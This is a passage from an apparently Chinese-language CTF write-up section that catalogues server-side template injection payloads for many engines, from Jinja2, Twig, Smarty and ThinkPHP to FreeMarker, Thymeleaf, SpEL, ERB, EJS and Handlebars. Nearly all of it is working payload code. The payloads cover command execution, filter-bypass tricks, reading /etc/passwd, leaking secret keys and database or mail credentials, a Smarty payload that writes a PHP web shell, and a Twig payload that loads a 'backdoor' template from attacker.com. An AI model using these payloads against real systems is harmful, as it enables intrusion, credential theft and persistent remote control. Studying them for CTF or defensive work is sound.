+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：通过 __subclasses__ 找到可利用的类</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：通过 __globals__ 访问 os 模块</span></span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：通过 lipsum 对象</span></span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法4：通过 cycler 对象</span></span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法5：通过 joiner 对象</span></span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.os.popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法6：通过 namespace 对象</span></span><br><span class="line">&#123;&#123;namespace.__init__.__globals__.os.popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过过滤：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过 . 过滤</span></span><br><span class="line">&#123;&#123;config[<span class="string">&#x27;SECRET_KEY&#x27;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;config|attr(<span class="string">&#x27;SECRET_KEY&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过 _ 过滤</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过关键字过滤</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/pas&#x27;</span><span class="string">&#x27;swd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 request 对象绕过</span></span><br><span class="line">&#123;&#123;request[<span class="string">&#x27;__class__&#x27;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(request.args.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-Python-Django-Templates"><a href="#4-2-Python-Django-Templates" class="headerlink" title="4.2 Python - Django Templates"></a>4.2 Python - Django Templates</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;settings&#125;&#125;                     → 设置对象</span><br><span class="line">&#123;&#123;settings.SECRET_KEY&#125;&#125;          → 密钥</span><br><span class="line">&#123;&#123;debug&#125;&#125;                        → 调试模式</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong> Django 模板引擎相对安全，默认不允许执行任意 Python 代码。但仍可能泄露敏感信息。</p>
+<p><strong>信息泄露：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;settings.DATABASES&#125;&#125;           → 数据库配置</span><br><span class="line">&#123;&#123;settings.EMAIL_HOST_PASSWORD&#125;&#125; → 邮件密码</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-Python-Mako"><a href="#4-3-Python-Mako" class="headerlink" title="4.3 Python - Mako"></a>4.3 Python - Mako</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;                           → 49</span><br><span class="line">$&#123;self.module.__file__&#125;          → 模块文件路径</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">$&#123;<span class="variable language_">self</span>.module.cache.util.os.popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-Python-Tornado"><a href="#4-4-Python-Tornado" class="headerlink" title="4.4 Python - Tornado"></a>4.4 Python - Tornado</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;                          → 49</span><br><span class="line">&#123;&#123;handler.settings&#125;&#125;             → 应用设置</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-5-PHP-Twig"><a href="#4-5-PHP-Twig" class="headerlink" title="4.5 PHP - Twig"></a>4.5 PHP - Twig</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;                          → 49</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;                        → 49</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;                    → 应用对象</span><br><span class="line">&#123;&#123;&#x27;test&#x27;|upper&#125;&#125;                 → TEST</span><br></pre></td></tr></table></figure>
+
+<p><strong>信息泄露：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;  → 服务器变量</span><br><span class="line">&#123;&#123;_self.env.getLoader()&#125;&#125;             → 加载器信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (Twig &lt; 1.20)：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (Twig 1.x)：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">setCache</span>(<span class="string">&quot;ftp://attacker.com/&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">loadTemplate</span>(<span class="string">&quot;backdoor&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (Twig 2.x&#x2F;3.x)：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]|<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]|<span class="title function_ invoke__">map</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]|<span class="title function_ invoke__">reduce</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;id&#x27;</span>|<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-6-PHP-Smarty"><a href="#4-6-PHP-Smarty" class="headerlink" title="4.6 PHP - Smarty"></a>4.6 PHP - Smarty</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;                → Smarty 版本</span><br><span class="line">&#123;$smarty.template&#125;               → 当前模板</span><br><span class="line">&#123;$smarty.now&#125;                    → 当前时间戳</span><br><span class="line">&#123;$smarty.const.PHP_VERSION&#125;      → PHP 版本</span><br></pre></td></tr></table></figure>
+
+<p><strong>信息泄露：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.server.SERVER_SOFTWARE&#125; → 服务器软件</span><br><span class="line">&#123;$smarty.env.PATH&#125;               → 环境变量</span><br><span class="line">&#123;$_SERVER&#125;                       → 服务器变量</span><br><span class="line">&#123;$_GET&#125;                          → GET 参数</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (Smarty &lt; 3.1.42)：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (使用 {if})：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (使用标签)：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);&#123;/php&#125;                    <span class="comment"># 需要开启 php 标签</span></span><br><span class="line">&#123;literal&#125;&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);&lt;/script&gt;&#123;/literal&#125;  <span class="comment"># PHP &lt; 7</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-7-PHP-ThinkPHP-ThinkTemplate"><a href="#4-7-PHP-ThinkPHP-ThinkTemplate" class="headerlink" title="4.7 PHP - ThinkPHP (ThinkTemplate)"></a>4.7 PHP - ThinkPHP (ThinkTemplate)</h3><p><strong>这就是本次 CTF 题目使用的模板引擎！</strong></p>
+<p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$_SERVER.SERVER_SOFTWARE&#125;       → 服务器软件 (Apache/2.4.65)</span><br><span class="line">&#123;$_SERVER.DOCUMENT_ROOT&#125;         → 文档根目录</span><br><span class="line">&#123;$_SERVER.REQUEST_URI&#125;           → 请求 URI</span><br><span class="line">&#123;$Think.PHP_VERSION&#125;             → PHP 版本</span><br></pre></td></tr></table></figure>
+
+<p><strong>变量输出语法：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;$name&#125;                          → 输出变量</span><br><span class="line">&#123;$_GET.param&#125;                    → 输出 GET 参数</span><br><span class="line">&#123;$_POST.param&#125;                   → 输出 POST 参数</span><br><span class="line">&#123;$_SESSION.user&#125;                 → 输出 SESSION</span><br><span class="line">&#123;$_COOKIE.token&#125;                 → 输出 COOKIE</span><br></pre></td></tr></table></figure>
+
+<p><strong>修饰符语法（关键特性）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$var|函数名&#125;                    → 对变量应用函数</span><br><span class="line">&#123;$var|@函数名&#125;                   → 变量作为第一个参数</span><br><span class="line">&#123;$var|func1|func2&#125;               → 链式调用</span><br><span class="line">&#123;$var|func=参数&#125;                 → 带额外参数</span><br></pre></td></tr></table></figure>
+
+<p><strong>文件读取 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;$_GET.f|@file|@implode&#125;&amp;f=/etc/passwd</span><br><span class="line">&#123;$_GET.f|@base64_decode|@file|@implode&#125;&amp;f=L2V0Yy9wYXNzd2Q=</span><br><span class="line">&#123;$_GET.f|@file|@json_encode&#125;&amp;f=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：使用 &#123;:&#125; 直接调用函数（如果没被过滤）</span></span><br><span class="line">&#123;:<span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line">&#123;:<span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：使用 array_map 绕过（本题使用的方法）</span></span><br><span class="line">&#123;<span class="variable">$_GET</span>.func|array_map=<span class="variable">$_GET</span>.cmd|implode&#125;&amp;func=passthru&amp;cmd[]=id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：使用 &#123;if&#125; 标签</span></span><br><span class="line">&#123;<span class="keyword">if</span>:<span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法4：使用 &#123;php&#125; 标签（如果开启）</span></span><br><span class="line">&#123;php&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);&#123;/php&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-8-PHP-Blade-Laravel"><a href="#4-8-PHP-Blade-Laravel" class="headerlink" title="4.8 PHP - Blade (Laravel)"></a>4.8 PHP - Blade (Laravel)</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;                          → 49</span><br><span class="line">&#123;!!7*7!!&#125;                        → 49 (不转义)</span><br><span class="line">@php phpinfo(); @endphp          → PHP 信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>信息泄露：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config(&#x27;app.key&#x27;)&#125;&#125;            → 应用密钥</span><br><span class="line">&#123;&#123;config(&#x27;database.connections&#x27;)&#125;&#125; → 数据库配置</span><br><span class="line">&#123;&#123;env(&#x27;APP_KEY&#x27;)&#125;&#125;               → 环境变量</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@php <span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>); @endphp</span><br><span class="line">@php <span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;id&#x27;</span>); @endphp</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-9-Java-FreeMarker"><a href="#4-9-Java-FreeMarker" class="headerlink" title="4.9 Java - FreeMarker"></a>4.9 Java - FreeMarker</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;                           → 49</span><br><span class="line">$&#123;.version&#125;                      → FreeMarker 版本</span><br><span class="line">$&#123;.now&#125;                          → 当前时间</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;ex(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign classloader=object.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign owc=classloader.loadClass(<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>)&gt;</span><br><span class="line">&lt;#assign rt=owc.newInstance().construct(<span class="string">&quot;java.lang.Runtime&quot;</span>)&gt;</span><br><span class="line">$&#123;rt.getRuntime().exec(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-10-Java-Velocity"><a href="#4-10-Java-Velocity" class="headerlink" title="4.10 Java - Velocity"></a>4.10 Java - Velocity</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($x=7*7)$x                   → 49</span><br><span class="line">$class.inspect(&quot;java.lang.Runtime&quot;) → 类信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set($rt=$class.inspect(<span class="string">&quot;java.lang.Runtime&quot;</span>).type.getRuntime())</span><br><span class="line">#set($chr=$class.inspect(<span class="string">&quot;java.lang.Character&quot;</span>).type)</span><br><span class="line">#set($str=$class.inspect(<span class="string">&quot;java.lang.String&quot;</span>).type)</span><br><span class="line">#set($ex=$rt.exec(<span class="string">&quot;id&quot;</span>))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [<span class="number">1.</span>.$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-11-Java-Thymeleaf"><a href="#4-11-Java-Thymeleaf" class="headerlink" title="4.11 Java - Thymeleaf"></a>4.11 Java - Thymeleaf</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;                           → 49</span><br><span class="line">$&#123;T(java.lang.Runtime)&#125;          → 类信息</span><br><span class="line">[[$&#123;7*7&#125;]]                       → 49 (内联表达式)</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;#rt = <span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>,#rt.exec(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">__$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;id&quot;</span>)&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-12-Java-Spring-SpEL"><a href="#4-12-Java-Spring-SpEL" class="headerlink" title="4.12 Java - Spring (SpEL)"></a>4.12 Java - Spring (SpEL)</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;                           → 49</span><br><span class="line">#&#123;7*7&#125;                           → 49</span><br><span class="line">$&#123;T(java.lang.System).getenv()&#125;  → 环境变量</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">#&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;id&#x27;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-13-Ruby-ERB"><a href="#4-13-Ruby-ERB" class="headerlink" title="4.13 Ruby - ERB"></a>4.13 Ruby - ERB</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 7*7 %&gt;                       → 49</span><br><span class="line">&lt;%= self %&gt;                      → 对象信息</span><br><span class="line">&lt;%= ENV %&gt;                       → 环境变量</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= system(<span class="string">&#x27;id&#x27;</span>) %&gt;</span><br><span class="line">&lt;%= <span class="string">`id`</span> %&gt;</span><br><span class="line">&lt;%= <span class="variable constant_">IO</span>.popen(<span class="string">&#x27;id&#x27;</span>).read %&gt;</span><br><span class="line">&lt;%= <span class="title class_">File</span>.read(<span class="string">&#x27;/etc/passwd&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-14-Node-js-EJS"><a href="#4-14-Node-js-EJS" class="headerlink" title="4.14 Node.js - EJS"></a>4.14 Node.js - EJS</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 7*7 %&gt;                       → 49</span><br><span class="line">&lt;%= process.version %&gt;           → Node.js 版本</span><br><span class="line">&lt;%= process.env %&gt;               → 环境变量</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;id&#x27;</span>).<span class="title function_">toString</span>() %&gt;</span><br><span class="line">&lt;%= <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;id&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-15-Node-js-Pug-Jade"><a href="#4-15-Node-js-Pug-Jade" class="headerlink" title="4.15 Node.js - Pug (Jade)"></a>4.15 Node.js - Pug (Jade)</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;7*7&#125;                           → 49</span><br><span class="line">#&#123;process.version&#125;               → Node.js 版本</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-16-Node-js-Handlebars"><a href="#4-16-Node-js-Handlebars" class="headerlink" title="4.16 Node.js - Handlebars"></a>4.16 Node.js - Handlebars</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">    &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">    &#123;&#123;/with&#125;&#125;</span><br><span class="line">  &#123;&#123;/with&#125;&#125;</span><br><span class="line">&#123;&#123;/with&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (需要特定条件)：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;#<span class="keyword">with</span> split <span 